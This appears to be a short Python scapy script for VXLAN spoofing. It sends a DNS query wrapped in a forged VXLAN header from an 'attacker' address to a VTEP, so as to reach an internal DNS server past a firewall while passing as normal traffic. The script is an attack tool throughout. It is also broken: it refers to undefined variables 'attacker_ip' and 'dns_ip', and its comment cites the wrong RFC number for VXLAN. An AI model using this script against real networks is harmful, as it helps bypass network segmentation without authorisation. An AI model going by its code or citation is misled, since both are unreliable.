#
# usage: python dns.py <domain>

###[ Loading modules ]###
import sys
import getopt
from scapy.all import PcapReader, wrpcap, Packet, NoPayload
from scapy.all import *
import threading
from threading import Thread
import time

vxlanport=4789     # RFC 7384 port 4789, Linux kernel default 8472
broadcastmac="ff:ff:ff:ff:ff:ff"
randommac="00:51:52:01:02:03"
vtep="192.168.10.149"
attacker="172.20.10.10"
destination="10.0.0.11"
# port is the one we want to contact inside the firewall
insideport=53
# this port is a high port, just make this look like a normal request
testport=50408
lookup = sys.argv[1]

# Outer Header for VxLAN-Spoofing
spoof_vxlan = IP(src=attacker_ip,dst=vtep)/UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=(1),flags="Instance")
# send dns request
send(spoof_vxlan/Ether(dst=broadcastmac,src=randommac)/IP(src=attacker_ip,dst=dns_ip)/UDP(sport=testport,dport=53)/DNS(rd=1,qd=DNSQR(qname=str(lookup),qtype="A")))
